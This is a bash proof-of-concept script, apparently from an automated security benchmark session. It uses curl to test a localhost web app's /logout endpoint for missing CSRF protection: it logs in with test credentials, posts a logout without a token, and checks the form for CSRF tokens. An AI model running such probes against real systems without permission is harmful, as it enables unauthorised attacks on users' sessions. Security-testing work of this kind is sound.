#!/bin/bash
# POC: CSRF vulnerability on logout endpoint - demonstrates unauthenticated POST request can trigger logout without CSRF token validation
# Target: ./repo
# Created: 2025-11-04T20:11:31.873Z
# Session: benchmark-XBEN-027-24-mhkzunic

# CSRF Vulnerability POC - Logout Endpoint
# This script demonstrates that the /logout endpoint is vulnerable to CSRF attacks
# because it accepts POST requests without CSRF token validation

TARGET="http://localhost:8080"
COOKIE_JAR="/tmp/csrf_logout_test.txt"

echo "=== CSRF Vulnerability on Logout Endpoint ==="
echo ""

# Step 1: Authenticate with valid credentials to establish session
echo "[*] Step 1: Authenticating with valid credentials..."
AUTH_RESPONSE=$(curl -s -c "$COOKIE_JAR" -d "username=test&user_id=10032&password=test" "$TARGET/password/test")
echo "[+] Authentication response received"

# Verify we have a valid session by checking if cookie was set
if grep -q "auth_token" "$COOKIE_JAR" 2>/dev/null; then
    echo "[+] Session cookie (auth_token) successfully set"
else
    echo "[-] No session cookie found - authentication may have failed"
fi

echo ""

# Step 2: Simulate CSRF attack - POST to logout WITHOUT CSRF token
echo "[*] Step 2: Attempting CSRF logout without CSRF token..."
LOGOUT_RESPONSE=$(curl -s -i -X POST -b "$COOKIE_JAR" "$TARGET/logout")

# Check if logout was successful (302 redirect to home)
if echo "$LOGOUT_RESPONSE" | grep -q "302 FOUND"; then
    echo "[+] CSRF logout succeeded! Server returned 302 FOUND"
    echo "[+] Logout accepted without CSRF token validation"
    VULN_CONFIRMED=1
elif echo "$LOGOUT_RESPONSE" | grep -q "302"; then
    echo "[+] CSRF logout succeeded! Server returned 302 redirect"
    echo "[+] Logout accepted without CSRF token validation"
    VULN_CONFIRMED=1
else
    echo "[-] Unexpected response:"
    echo "$LOGOUT_RESPONSE" | head -20
    VULN_CONFIRMED=0
fi

echo ""

# Step 3: Verify no CSRF tokens are present in the logout form
echo "[*] Step 3: Checking logout form for CSRF tokens..."
LOGOUT_FORM=$(curl -s "$TARGET/dashboard" 2>/dev/null || curl -s "$TARGET/")

if echo "$LOGOUT_FORM" | grep -i "csrf" > /dev/null; then
    echo "[-] CSRF tokens found in logout form (potential mitigation)"
else
    echo "[+] No CSRF tokens found in logout form"
    echo "[+] Vulnerability confirmed: logout form lacks CSRF protection"
fi

echo ""

# Step 4: Demonstrate unauthenticated logout is also possible
echo "[*] Step 4: Testing unauthenticated logout (should fail or be blocked)..."
UNAUTH_LOGOUT=$(curl -s -i -X POST "$TARGET/logout")

if echo "$UNAUTH_LOGOUT" | grep -q "302"; then
    echo "[+] CRITICAL: Unauthenticated logout also succeeds with 302 redirect!"
    echo "[+] This allows complete logout without any authentication"
    echo "[+] CSRF vulnerability severity is HIGH"
elif echo "$UNAUTH_LOGOUT" | grep -q "401\|403"; then
    echo "[+] Unauthenticated logout properly rejected (302 would be vulnerable)"
else
    echo "[!] Unexpected response for unauthenticated logout"
fi

echo ""
echo "=== VULNERABILITY SUMMARY ==="
if [ $VULN_CONFIRMED -eq 1 ]; then
    echo "[+] CSRF vulnerability CONFIRMED on /logout endpoint"
    echo "[+] The endpoint accepts logout requests without CSRF token validation"
    echo "[+] An attacker can force authenticated users to logout via CSRF"
    exit 0
else
    echo "[-] Could not confirm CSRF vulnerability"
    exit 1
fi